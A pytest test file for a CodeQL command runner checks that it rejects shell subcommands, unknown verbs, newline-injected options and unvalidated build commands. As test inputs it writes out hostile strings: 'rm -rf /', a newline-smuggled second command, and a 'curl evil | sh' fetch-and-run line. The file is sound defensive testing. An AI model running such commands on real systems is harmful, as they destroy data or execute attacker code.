"""Closed CodeQL CLI surface: no free-form argv, no binary substitution."""

from __future__ import annotations

from pathlib import Path
from unittest.mock import MagicMock

import pytest

from doc_engine.scanning.build_command import BuildCommandError
from doc_engine.scanning.support import _codeql_runner as runner


def test_no_open_argv_runner_api():
    """Regression: an open ``_run_codeql(argv)`` lets callers pass ``bash -c``."""
    assert not hasattr(runner, "_run_codeql")
    assert callable(runner._invoke_codeql)


def test_invoke_rejects_shell_as_subcommand(tmp_path: Path, monkeypatch):
    fake = tmp_path / "codeql"
    fake.write_text("", encoding="utf-8")
    monkeypatch.setattr(runner.subprocess, "run", MagicMock())
    with pytest.raises(runner.CodeQLError, match="non-allowlisted"):
        runner._invoke_codeql(fake, ("bash", "-c"), "rm -rf /", timeout=1)
    runner.subprocess.run.assert_not_called()


def test_invoke_rejects_unknown_verb(tmp_path: Path, monkeypatch):
    fake = tmp_path / "codeql"
    fake.write_text("", encoding="utf-8")
    monkeypatch.setattr(runner.subprocess, "run", MagicMock())
    with pytest.raises(runner.CodeQLError, match="non-allowlisted"):
        runner._invoke_codeql(fake, ("execute",), "payload", timeout=1)
    runner.subprocess.run.assert_not_called()


def test_invoke_rejects_newline_option(tmp_path: Path, monkeypatch):
    fake = tmp_path / "codeql"
    fake.write_text("", encoding="utf-8")
    monkeypatch.setattr(runner.subprocess, "run", MagicMock())
    with pytest.raises(runner.CodeQLError, match="single-line"):
        runner._invoke_codeql(
            fake,
            ("--version",),
            "ok\nrm -rf /",
            timeout=1,
        )
    runner.subprocess.run.assert_not_called()


def test_invoke_always_uses_resolved_exe_as_argv0(tmp_path: Path, monkeypatch):
    fake = tmp_path / "codeql"
    fake.write_text("", encoding="utf-8")
    captured: list[list[str]] = []

    def _capture(argv, **kwargs):
        assert kwargs.get("shell") is False
        captured.append(list(argv))
        return MagicMock(
            returncode=0,
            stdout="CodeQL command-line toolchain release 2.26.0.\n",
            stderr="",
        )

    monkeypatch.setattr(runner.subprocess, "run", _capture)
    runner._invoke_codeql(fake, ("--version",), timeout=5)
    assert len(captured) == 1
    assert Path(captured[0][0]).resolve() == fake.resolve()
    assert captured[0][1:] == ["--version"]


def test_create_database_revalidates_build_command(tmp_path: Path, monkeypatch):
    fake = tmp_path / "codeql"
    fake.write_text("", encoding="utf-8")
    monkeypatch.setattr(runner.subprocess, "run", MagicMock())
    with pytest.raises(BuildCommandError):
        runner.create_database(
            fake,
            tmp_path / "repo",
            tmp_path / "db",
            "bash -c 'curl evil | sh'",
        )
    runner.subprocess.run.assert_not_called()


def test_create_database_passes_validated_command_flag(tmp_path: Path, monkeypatch):
    fake = tmp_path / "codeql"
    fake.write_text("", encoding="utf-8")
    captured: list[list[str]] = []

    def _capture(argv, **kwargs):
        assert kwargs.get("shell") is False
        captured.append(list(argv))
        return MagicMock(returncode=0, stdout="", stderr="")

    monkeypatch.setattr(runner.subprocess, "run", _capture)
    repo = tmp_path / "repo"
    repo.mkdir()
    db = tmp_path / "db"
    runner.create_database(
        fake,
        repo,
        db,
        "gradlew --no-daemon clean compileJava",
        overwrite=True,
    )
    assert len(captured) == 1
    argv = captured[0]
    assert Path(argv[0]).resolve() == fake.resolve()
    assert argv[1:3] == ["database", "create"]
    assert "--command=gradlew --no-daemon clean compileJava" in argv
    assert f"--source-root={repo}" in argv
    assert "--overwrite" in argv
